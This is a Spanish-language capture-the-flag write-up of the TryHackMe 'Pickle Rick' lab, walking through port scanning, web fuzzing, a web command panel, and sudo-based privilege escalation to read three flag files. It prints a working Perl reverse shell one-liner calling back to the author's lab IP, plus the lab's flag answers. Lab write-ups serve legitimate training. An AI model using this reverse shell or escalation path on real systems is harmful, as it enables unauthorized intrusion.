---
title: Try Hack Me Pickle Rick
author: k4miyo
date: 2023-06-17
math: true
mermaid: true
image:
  path: /assets/images/thm/tryhackme.png
categories: [Easy, Linux]
tags: [Web, SSH]
ping: true
---

## Máquina Pickle Rick
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.151.209.

```bash
❯ ping -c 1 10.10.151.209
PING 10.10.151.209 (10.10.151.209) 56(84) bytes of data.
64 bytes from 10.10.151.209: icmp_seq=1 ttl=63 time=153 ms

--- 10.10.151.209 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.932/152.932/152.932/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T 5 -v -n 10.10.151.209 -oG allPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 19:30 CST
Initiating Ping Scan at 19:30
Scanning 10.10.151.209 [4 ports]
Completed Ping Scan at 19:30, 0.19s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:30
Scanning 10.10.151.209 [65535 ports]
Discovered open port 22/tcp on 10.10.151.209
Discovered open port 80/tcp on 10.10.151.209
Completed SYN Stealth Scan at 19:31, 42.88s elapsed (65535 total ports)
Nmap scan report for 10.10.151.209
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 43.19 seconds
           Raw packets sent: 70812 (3.116MB) | Rcvd: 70195 (2.808MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬──────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.151.209
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.151.209 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 19:32 CST
Nmap scan report for 10.10.151.209
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f276e6fc058ca12c8b700996b887055 (RSA)
|   256 92f490b551070b07351b01e1c4e20ac0 (ECDSA)
|_  256 eb203aa986027c564364bddaae6535ee (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.35 seconds
```

Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web,  vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.151.209/
http://10.10.151.209/ [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.151.209], JQuery, Script, Title[Rick is sup4r cool]
```

No vemos nada interesante, así que vamos a ver el contenido vía web.

![""](/assets/images/thm-picklerick/picklerick.png)

*Help Morty!*
*Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!*
*I need you to ***BURRRP***....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the ***BURRRRRRRRP***, password was! Help Morty, Help!*

Al parecer tenemos que encontrar el nombre de 3  ingredientes. 

Si observamos el contenido del código html, obtenemos el nombre de usuario:

![""](/assets/images/thm-picklerick/picklerick1.png)

Como no se observa algo adicional, podríamos tratar de encontrar directorios de interes en el servidor web:

```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.151.209/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.151.209/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000277:   200        22 L     118 W      2192 Ch     "assets"                                                                                                                    
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 91.51206
Processed Requests: 4780
Filtered Requests: 4779
Requests/sec.: 52.23355
```

Encontramos un directorio **assets** cuyo tenido no nos dice mucho; asi que vamos a tratar de de búscar archivos de extensión html, php, txt.

![""](/assets/images/thm-picklerick/picklerick2.png)


```bash
❯ wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt http://10.10.151.209/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.151.209/FUZZ.FUZ2Z
Total requests: 661638

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000001:   200        37 L     110 W      1062 Ch     "index - html"                                                                                                              
000000116:   200        25 L     61 W       882 Ch      "login - php"                                                                                                               
000001061:   200        25 L     61 W       882 Ch      "portal - php"                                                                                                              
000005253:   200        1 L      1 W        17 Ch       "robots - txt"                                                                                                              
000005858:   404        9 L      32 W       292 Ch      "webservices - php"                                                                                                         

Total time: 0
Processed Requests: 5874
Filtered Requests: 5870
Requests/sec.: 0
```

Encontramos algunos recursos a los cuales vamos a echarles un ojo:

![""](/assets/images/thm-picklerick/picklerick3.png)

![""](/assets/images/thm-picklerick/picklerick4.png)

El archivo **robots.txt** contiene la frase ***Wubbalubbadubdub***, por lo que podría ser una posible contraseña del usuario que tenemos y además, en el recurso **login.php** (el recurso **portal.php** nos redirige a login.php) se tiene un panel de acceso, por lo que podriamos tratar de acceder:

![""](/assets/images/thm-picklerick/picklerick5.png)

Se tiene una linea de comandos, por lo tanto podríamos tratar de ejecutar algún comando:

![""](/assets/images/thm-picklerick/picklerick6.png)

Vemos que podemos ejecutar comandos a nivel de sistema, por lo tanto, podríamos tratar de entablarnos una reverse shell, para este caso en especial, utilizaremos perl de acuerdo con [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```perl
perl -e 'use Socket;$i="10.9.85.95";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.9.85.95] from (UNKNOWN) [10.10.59.35] 39620
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Para trabajar más cómodos, haremos un [Tratamiento de la tty](/posts/tratamiento-tty). En la ruta en la que nos encontramos, vemos el archivo **Sup3rS3cretPickl3Ingred.txt** el cual tiene un ingrediente.

```bash
www-data@ip-10-10-59-35:/var/www/html$ ls -la
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
www-data@ip-10-10-59-35:/var/www/html$
```

Si accedemos al directorio `/home/` vemos 2 usuarios:

```bash
www-data@ip-10-10-59-35:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Jun 18 02:37 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
www-data@ip-10-10-59-35:/home$
```

Si accedemos al directorio de **rick**, vemos el segundo ingrediente:

```bash
www-data@ip-10-10-59-35:/home$ cd rick/
www-data@ip-10-10-59-35:/home/rick$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
www-data@ip-10-10-59-35:/home/rick$ cat second\ ingredients 
1 jerry tear
www-data@ip-10-10-59-35:/home/rick$
```

Ahora debemos encontrar el tercer ingrediente, por lo tanto, vamos a enumerar un poco el sistema:

```bash
www-data@ip-10-10-59-35:/home/rick$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-10-59-35:/home/rick$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-59-35.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-59-35.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-59-35:/home/rick$ 
```

Vemos que podemos ejecutar cualquier comando como el usuario **root**, por lo tanto, nos lanzamos una bash:

```bash
www-data@ip-10-10-59-35:/home/rick$ sudo bash -p
root@ip-10-10-59-35:/home/rick# whoami
root
root@ip-10-10-59-35:/home/rick# 
```

Si ingresamos al directorio de **root** ya podemos visualizar el tercer ingrediente:

```bash
root@ip-10-10-59-35:/home/rick# cd /root/
root@ip-10-10-59-35:~# ll
total 28
drwx------  4 root root 4096 Feb 10  2019 ./
drwxr-xr-x 23 root root 4096 Jun 18 02:37 ../
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh/
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap/
root@ip-10-10-59-35:~# cat 3rd.txt 
3rd ingredients: fleeb juice
root@ip-10-10-59-35:~# 
```